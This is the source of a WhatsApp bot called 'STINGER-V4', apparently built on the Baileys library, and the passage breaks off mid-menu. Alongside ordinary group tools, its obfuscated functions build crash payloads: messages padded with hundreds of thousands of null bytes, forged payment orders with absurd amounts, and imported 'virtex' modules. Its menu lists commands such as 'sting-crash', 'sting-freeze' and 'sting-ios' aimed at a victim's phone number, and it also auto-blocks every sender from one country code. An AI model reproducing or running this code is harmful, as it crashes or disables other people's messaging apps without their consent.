module.exports = async (sock, m, store) => {
  try {
    const from = m.key.remoteJid;
    const quoted = m.quoted ? m.quoted : m;
    var body = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
    const text = typeof m.text == "string" ? m.text : "";
    const prefixMatch = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const isCmd = body.startsWith(prefixMatch);
    const command = body.replace(prefixMatch, "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const mime = (quoted.msg || quoted).mimetype || "";
    const text2 = q = args.join(" ");
    const isGroup = from.endsWith("@g.us");
    const botNumber = await sock.decodeJid(sock.user.id);
    const sender = m.key.fromMe ? sock.user.id.split(":")[0] + "@s.whatsapp.net" || sock.user.id : m.key.participant || m.key.remoteJid;
    const senderNumber = sender.split("@")[0];
    const pushname = m.pushName || "" + senderNumber;
    const isBotNumberMatch = botNumber.includes(senderNumber);
    const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch(_0x3f55e6 => {}) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const participants = isGroup ? await groupMetadata.participants : "";
    const groupAdmins = isGroup ? await participants.filter(_0x23f03a => _0x23f03a.admin !== null).map(_0x20194d => _0x20194d.id) : "";
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const participants2 = isGroup ? groupMetadata.participants : "";
    const isBotAdmin = isGroup ? groupAdmins.includes(botNumber) : false;
    const isBotAdmin2 = isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmin = isGroup ? groupAdmins.includes(sender) : false;
    const countFeatures = () => {
      var _0x20bf8e = fs.readFileSync("./STINGER-V4.js").toString();
      var _0x45c368 = (_0x20bf8e.match(/case '/g) || []).length;
      return _0x45c368;
    };
    const isAdmin2 = isGroup ? groupAdmins.includes(sender) : false;
    const todayShort = moment.tz("Asia/Jakarta").format("DD/MM/YY");
    const {
      Client: SSHClient
    } = require("ssh2");
    const jsObfuscator = require("javascript-obfuscator");
    const {
      addSaldo: addSaldo,
      minSaldo: minSaldo,
      cekSaldo: cekSaldo
    } = require("./database/dtbs/deposit");
    const {
      mediafireDl: mediafireDl
    } = require("./database/dtbs/mediafire.js");
    const {
      beta1: beta1,
      beta2: beta2,
      buk1: buk1
    } = require("./database/lib/hdr.js");
    const processingText = "𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐈𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒";
    const {
      ios: ios
    } = require("./database/virtex/ios.js");
    const {
      telapreta3: telapreta3
    } = require("./database/virtex/telapreta3.js");
    const {
      convite: convite
    } = require("./database/virtex/convite.js");
    const {
      bugpdf: bugpdf
    } = require("./database/virtex/bugpdf.js");
    const {
      cP: cP
    } = require("./database/virtex/bugUrl.js");
    if (m.sender.startsWith("212")) {
      return sock.updateBlockStatus(m.sender, "block");
    }
    const colorList = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
    const randomColor = colorList[Math.floor(Math.random() * colorList.length)];
    let uptime = runtime(process.uptime());
    if (isCmd) {
      console.log(chalk.white.bgRed.bold("New Message"), color("[ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ]", "green"), color("FROM", "red"), color("" + pushname, "red"), color("Text :", "yellow"), color("" + body, "blue"));
    }
    const todayLong = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const timeJakarta = moment.tz("Asia/Jakarta").format("HH : mm :ss");
    const timeJayapura = moment.tz("Asia/Jayapura").format("HH : mm : ss");
    const timeMakassar = moment.tz("Asia/Makassar").format("HH : mm : ss");
    const currentTime = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (currentTime < "23:59:00") {
      var greeting = "Good Morning Beautiful/Handsome 🏙️";
    }
    if (currentTime < "19:00:00") {
      var greeting = "Good evening🌆";
    }
    if (currentTime < "18:00:00") {
      var greeting = "Good Morning 🌇";
    }
    if (currentTime < "15:00:00") {
      var greeting = "Good afternoon 🌤️";
    }
    if (currentTime < "10:00:00") {
      var greeting = "Good evening 🌄";
    }
    if (currentTime < "05:00:00") {
      var greeting = "Good evening🌆";
    }
    if (currentTime < "03:00:00") {
      var greeting = "Good night🌃";
    }
    sock.autoshalat = sock.autoshalat ? sock.autoshalat : {};
    let chatId = m.chat;
    if (chatId in sock.autoshalat) {
      return false;
    }
    let shalatTimes = {
      shubuh: "04:29",
      terbit: "05:44",
      dhuha: "06:02",
      dzuhur: "12:02",
      ashar: "15:15",
      magrib: "17:52",
      isya: "19:01"
    };
    const nowDate = new Date(new Date().toLocaleString("en-US", {
      timeZone: "Asia/Jakarta"
    }));
    const nowHour = nowDate.getHours();
    const nowMinute = nowDate.getMinutes();
    const nowHM = nowHour.toString().padStart(2, "0") + ":" + nowMinute.toString().padStart(2, "0");
    for (let [_0x2f6bda, _0x5f43ea] of Object.entries(shalatTimes)) {
      if (nowHM === _0x5f43ea) {
        sock.autoshalat[chatId] = [sock.sendMessage(m.chat, {
          audio: {
            url: "https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y"
          },
          mimetype: "audio/mp4",
          ptt: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              mediaType: 1,
              mediaUrl: "",
              title: "𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐈𝐒 𝐀𝐂𝐓𝐈𝐕𝐄",
              body: "❄ " + _0x5f43ea,
              sourceUrl: "https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y",
              thumbnail: await fs.readFileSync("./database/image/STINGER.jpg"),
              renderLargerThumbnail: true
            }
          }
        }, {}), setTimeout(async () => {
          delete client.autoshalat[m.chat];
        }, 57000)];
      }
    }
    const contactsList = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"));
    const premiumList = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"));
    const ownerList = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"));
    const isSavedContact = contactsList.includes(sender);
    const isPremium = premiumList.includes(sender);
    const isOwner = ownerList.includes(senderNumber) || isBotNumberMatch;
    sock.sendButtonVideo = async (_0x49b7d5, _0x391a8b, _0x59e933, _0x553b61 = {}) => {
      const _0x2e7f57 = {
        url: _0x553b61 && _0x553b61.video ? _0x553b61.video : ""
      };
      const _0x8f12ad = {
        video: _0x2e7f57
      };
      const _0x4cfab0 = {
        upload: sock.waUploadToServer
      };
      var _0x1c5168 = await prepareWAMessageMedia(_0x8f12ad, _0x4cfab0);
      const _0x45afa6 = {
        text: _0x553b61 && _0x553b61.body ? _0x553b61.body : ""
      };
      const _0x47474e = {
        text: _0x553b61 && _0x553b61.footer ? _0x553b61.footer : ""
      };
      const _0x1ff92c = {
        hasMediaAttachment: true,
        videoMessage: _0x1c5168.videoMessage
      };
      const _0x4637c7 = {
        buttons: _0x391a8b,
        messageParamsJson: ""
      };
      const _0x455589 = {
        title: global.namabot,
        body: "By ES TEAMS",
        thumbnailUrl: global.imageurl,
        sourceUrl: global.isLink,
        mediaType: 1,
        renderLargerThumbnail: true
      };
      const _0x1f533b = {
        externalAdReply: _0x455589
      };
      const _0x5b625c = {
        body: _0x45afa6,
        footer: _0x47474e,
        header: _0x1ff92c,
        nativeFlowMessage: _0x4637c7,
        contextInfo: _0x1f533b
      };
      const _0x3f82b2 = {
        interactiveMessage: _0x5b625c
      };
      const _0x1b7028 = {
        message: _0x3f82b2
      };
      const _0x52ca9e = {
        viewOnceMessage: _0x1b7028
      };
      const _0x5e9382 = {
        quoted: _0x59e933
      };
      let _0x160f71 = generateWAMessageFromContent(_0x49b7d5, _0x52ca9e, _0x5e9382);
      await sock.sendPresenceUpdate("composing", _0x49b7d5);
      return sock.relayMessage(_0x49b7d5, _0x160f71.message, {
        messageId: _0x160f71.key.id
      });
    };
    async function _0x3decb7(_0xb05b6a, _0x3be9dc, _0x4541fd, _0x28f44e, _0x5138d2, _0x6b04c9, _0x1516ef, _0x158382) {
      const _0x19743b = {
        filterName: _0x3be9dc,
        parameters: _0x4541fd,
        filterResult: _0x28f44e,
        clientNotSupportedConfig: _0x5138d2
      };
      const _0x5a4530 = {
        clauseType: _0x6b04c9,
        clauses: _0x1516ef,
        filters: _0x158382
      };
      const _0x13ae2b = {
        filter: _0x19743b,
        filterClause: _0x5a4530
      };
      const _0x447e35 = {
        qp: _0x13ae2b
      };
      var _0x35ed90 = generateWAMessageFromContent(_0xb05b6a, proto.Message.fromObject(_0x447e35), {
        userJid: _0xb05b6a
      });
      await sock.relayMessage(_0xb05b6a, _0x35ed90.message, {
        participant: {
          jid: _0xb05b6a
        },
        messageId: _0x35ed90.key.id
      });
    }
    async function _0x49d301(_0x1a28f7, _0x14e6f4, _0x478461, _0x553992, _0x1c3324, _0x230775, _0x166d4c, _0x3da3f0, _0x510c61, _0x511ebf, _0x193843, _0x4ffa8c, _0x26269b, _0x405152) {
      const _0x27d870 = {
        sessionVersion: _0x14e6f4,
        localIdentityPublic: _0x478461,
        remoteIdentityPublic: _0x553992,
        rootKey: _0x1c3324,
        previousCounter: _0x230775,
        senderChain: _0x166d4c,
        receiverChains: _0x3da3f0,
        pendingKeyExchange: _0x510c61,
        pendingPreKey: _0x511ebf,
        remoteRegistrationId: _0x193843,
        localRegistrationId: _0x4ffa8c,
        needsRefresh: _0x26269b,
        aliceBaseKey: _0x405152
      };
      const _0xce6804 = {
        sessionStructure: _0x27d870
      };
      var _0x233c49 = generateWAMessageFromContent(_0x1a28f7, proto.Message.fromObject(_0xce6804), {
        userJid: _0x1a28f7
      });
      await sock.relayMessage(_0x1a28f7, _0x233c49.message, {
        participant: {
          jid: _0x1a28f7
        },
        messageId: _0x233c49.key.id
      });
    }
    const _0x1115bd = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function _0x3b8ee3(_0x4c17de) {
      var _0x38db3e = generateWAMessageFromContent(_0x4c17de, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + bugpdf + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      sock.relayMessage(_0x4c17de, _0x38db3e.message, {
        messageId: _0x38db3e.key.id
      });
    }
    async function _0x1c9e91(_0x1bffb8) {
      var _0x4b9e9e = generateWAMessageFromContent(_0x1bffb8, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363313305181359@newsletter",
              newsletterName: "Zynxzo Script" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Zynxzo Script Admin Channel Invitation",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: _0x1bffb8
      });
      await sock.relayMessage(_0x1bffb8, _0x4b9e9e.message, {
        participant: {
          jid: _0x1bffb8
        },
        messageId: _0x4b9e9e.key.id
      });
    }
    const _0x4623d2 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x4df7a0 = {
      key: _0x4623d2,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./database/image/PASCHAL.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x1c59a0 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x5b1a8e = {
      key: _0x1c59a0,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./database/image/PASCHAL.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    let _0x5e851e = [];
    for (let _0x594681 of ownerList) {
      _0x5e851e.push({
        displayName: await sock.getName(_0x594681 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await sock.getName(_0x594681 + "@s.whatsapp.net")) + "\n\nFN:" + (await sock.getName(_0x594681 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x594681 + ":" + _0x594681 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: examsolutionteam@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    function _0x1522f0(_0x136732) {
      return "```" + _0x136732 + "```";
    }
    function _0x1db80b(_0x51a367) {
      var _0x28e16d = "";
      var _0x2bfd00 = _0x51a367.toString().split("").reverse().join("");
      for (var _0x46ecc6 = 0; _0x46ecc6 < _0x2bfd00.length; _0x46ecc6++) {
        if (_0x46ecc6 % 3 == 0) {
          _0x28e16d += _0x2bfd00.substr(_0x46ecc6, 3) + ".";
        }
      }
      return "" + _0x28e16d.split("", _0x28e16d.length - 1).reverse().join("");
    }
    try {
      ppuser = await sock.profilePictureUrl(m.sender, "image");
    } catch (_0x5d9bc0) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x68eab(_0x42c50a) {
      return new Promise((_0x1635ba, _0x4eb6f0) => {
        try {
          const _0x1e37e7 = jsObfuscator.obfuscate(_0x42c50a, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
          });
          const _0x54b08b = {
            status: 200,
            author: "zyn",
            result: _0x1e37e7.getObfuscatedCode()
          };
          _0x1635ba(_0x54b08b);
        } catch (_0x42c1b4) {
          _0x4eb6f0(_0x42c1b4);
        }
      });
    }
    if (!sock.public) {
      if (!m.key.fromMe) {
        return;
      }
    }
    const _0x63f1cc = await reSize(ppuser, 300, 300);
    const _0x1bee92 = async (_0x468e05, _0xbd8e15, _0x5db132, _0xe353c9, _0x41222b, _0x1d3bbb, _0x292e1f, _0x5c5bb1, _0x188d31) => {
      const _0x16fbd5 = generateWAMessageFromContent(_0x468e05, proto.Message.fromObject({
        orderMessage: {
          orderId: _0x5db132,
          thumbnail: _0xe353c9,
          itemCount: _0x41222b,
          status: "INQUIRY",
          surface: "CATALOG",
          orderTitle: _0x1d3bbb,
          message: _0xbd8e15,
          sellerJid: _0x292e1f,
          token: _0x5c5bb1,
          totalAmount1000: _0x188d31,
          totalCurrencyCode: "IDR"
        }
      }), {
        userJid: _0x468e05,
        quoted: m
      });
      sock.relayMessage(_0x468e05, _0x16fbd5.message, {
        messageId: _0x16fbd5.key.id
      });
    };
    const _0x1595c1 = _0x2a4900 => {
      sock.sendMessage(m.chat, {
        text: _0x2a4900,
        contextInfo: {
          mentionedJid: [sender],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: " S҉ T҉ I҉ N҉ G҉ E҉ R҉",
            body: "" + namabot,
            previewType: "PHOTO",
            thumbnailUrl: "",
            thumbnail: fs.readFileSync("./database/image/STINGER-V4.jpg"),
            sourceUrl: "" + isLink
          }
        }
      }, {
        quoted: m
      });
    };
    const _0xe72ade = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(from ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x39abf8 = {
      key: _0xe72ade,
      message: {
        contactMessage: {
          displayName: "" + pushname,
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + pushname + ",\nitem1.TEL;waid=" + sender.split("@")[0] + ":" + sender.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          jpegThumbnail: {
            url: "https://g.top4top.io/p_3194iz70l0.jpg"
          }
        }
      }
    };
    function _0x32e785(_0x4772bf = "") {
      return [..._0x4772bf.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x4ae8f8 => _0x4ae8f8[1] + "@s.whatsapp.net");
    }
    if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
      if (!isBotAdmin) {
        return;
      }
      if (text.match("whatsapp.com")) {
        const _0x3557c5 = {
          text: "*Antilink Group Link Detected*\n\nYou Will Be Removed From The Group " + groupMetadata.subject
        };
        sock.sendMessage(m.chat, _0x3557c5, {
          quoted: m
        });
        sock.groupParticipantsUpdate(m.chat, [sender], "delete");
        sock.sendMessage(m.chat, {
          delete: m.key
        });
      }
    }
    switch (command) {
      case "stinger":
        {
          await sock.sendMessage(m.chat, {
            react: {
              text: "❄️",
              key: m.key
            }
          });
          const _0x564031 = fs.readFileSync("./database/ES_TEAMS.mp3");
          const _0x477baa = require("baileys/package.json").version;
          const _0x413632 = "╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮\n┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽\n┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ " + versisc + " 🔝💻\n┃❁️ _ᴍᴏᴅᴇʟ:_ " + namabot + " 🤖💸\n┃❁️ _ᴜᴘᴛɪᴍᴇ:_ " + runtime(process.uptime()) + " ⏰🔋\n╰━━━━━━❄️◁️🕷️━━━━━━╯\n╰⭑➤➤⭑➤➤⭑➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ\n> 𝐚𝐝𝐝-𝐬𝐭𝐢𝐧𝐠 ◁️❄️🕷️\n> 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 ◁️❄️🕷️\n> 𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 ◁️❄️🕷️\n> 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 ◁️❄️🕷️\n> 𝐬𝐞𝐭-𝐬𝐭𝐢𝐧𝐠 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴛᴏᴏʟꜱ\n> 𝐞𝐧𝐜 [ 𝐜𝐨𝐝𝐞 ]◁️❄️🕷️\n> 𝐞𝐧𝐜𝐫𝐲𝐩𝐭 [ 𝐜𝐨𝐝𝐞 ]◁️❄️🕷️\n> 𝐚𝐢 [ 𝐭𝐞𝐱𝐭 ]◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ɢʀᴏᴜᴘ\n> 𝐡𝐢𝐝𝐞𝐭𝐚𝐠 ◁️❄️🕷️\n> 𝐭𝐚𝐠𝐚𝐥𝐥 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐤𝐢𝐜𝐤 ◁️❄️🕷️\n> 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 ◁️❄️🕷️\n> 𝐝𝐞𝐦𝐨𝐭𝐞 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ꜱᴛᴏʀᴇ\n> 𝐩𝐚𝐲𝐦𝐞𝐧𝐭 ◁️❄️🕷️\n> 𝐝𝐚𝐧𝐚𝐦𝐚𝐬𝐮𝐤 ◁️❄️🕷️\n> 𝐩𝐫𝐨𝐬𝐞𝐬 ◁️❄️🕷️\n> 𝐝𝐨𝐧𝐞 ◁️❄️🕷️\n> 𝐣𝐩𝐦𝐩𝐫𝐨𝐦𝐨𝐬𝐢 ◁️❄️🕷️\n> 𝐣𝐩𝐦𝟑 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴘᴀɴᴇʟ\n> 𝟏𝐆𝐁 ◁️❄️🕷️\n> 𝟐𝐆𝐁 ◁️❄️🕷️\n> 𝟑𝐆𝐁 ◁️❄️🕷️\n> 𝟒𝐆𝐁 ◁️❄️🕷️\n> 𝟓𝐆𝐁 ◁️❄️🕷️\n> 𝟔𝐆𝐁 ◁️❄️🕷️\n> 𝟕𝐆𝐁 ◁️❄️🕷️\n> 𝟖𝐆𝐁 ◁️❄️🕷️\n> 𝟗𝐆𝐁 ◁️❄️🕷️\n> 𝐮𝐧𝐥𝐢 ◁️❄️🕷️\n> 𝐥𝐢𝐬𝐭𝐬𝐫𝐯 ◁️❄️🕷️\n> 𝐝𝐞𝐥𝐬𝐫𝐯 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤  ᴄᴏᴜʀꜱᴇ ʙᴜɢ\n> 𝐬𝐭𝐢𝐧𝐠𝐞𝐫-𝐛𝐥𝐚𝐬𝐭 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ᴀᴛᴛᴀᴄᴋ ʙᴜɢ\n> 𝐬𝐭𝐢𝐧𝐠𝐞𝐫-𝐯𝟐 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐬𝐥𝐢𝐝𝐞 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐟𝐫𝐞𝐞𝐳𝐞 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐦𝐞𝐝𝐢𝐮𝐦 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ᴀᴛᴛᴀᴄᴋ ᴏᴛʜᴇʀ\n> 𝐬𝐭𝐢𝐧𝐠-𝐢𝐨𝐬 [ 𝐧𝐮𝐦𝐛𝐞𝐫] ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐜𝐫𝐚𝐬𝐡 [𝐧𝐮𝐦𝐛𝐞𝐫] ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐚𝐭𝐤 [𝐧𝐮𝐦𝐛𝐞𝐫] ◁️❄️🕷️\n\n⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴀɴᴛɪʙᴜɢ \n> 𝐬𝐭𝐢𝐧𝐠-𝐨𝐧 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐨𝐟𝐟 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐩𝐚𝐲 ◁️❄️🕷️\n> 𝐜𝐨𝐧𝐟𝐢𝐫𝐦-𝐩𝐚𝐲 ◁️❄️🕷\n\n╰⭑➤➤⭑➤➤⭑➤  ꜱᴛɪɴɢᴇʀ ʙᴀɴɴᴇʀ +\n> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧𝟐 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧𝟑◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧𝟒◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤  ꜱᴛɪɴɢᴇʀ ʟᴏᴄᴋ\n> 𝐬𝐭𝐢𝐧𝐠-𝐥𝐨𝐜𝐤 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐮𝐧𝐥𝐨𝐜𝐤 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐫𝐞𝐬𝐞𝐭 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴛᴏᴏʟꜱ +\n> 𝐦𝐞𝐧𝐮 ◁️❄️🕷️\n> 𝐭𝐞𝐬𝐭 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐮𝐩𝐝𝐚𝐭𝐞 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐚𝐢 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐚𝐧𝐢𝐦𝐞 ◁️❄️🕷️\n> 𝐫𝐮𝐧𝐭𝐢𝐦𝐞 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐢𝐩 ◁️❄️🕷\n> 𝐬𝐭𝐢𝐧𝐠-𝐱𝐱𝐱 ◁️❄️🕷️\n> 𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ᴘʀᴇᴍɪᴜᴍ ᴘᴀʏᴍᴇɴᴛ\n> 𝐬𝐭𝐢𝐧𝐠-𝐩𝐚𝐲 ◁️❄️🕷️\n> 𝐜𝐨𝐧𝐟𝐢𝐫𝐦-𝐩𝐚𝐲 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤  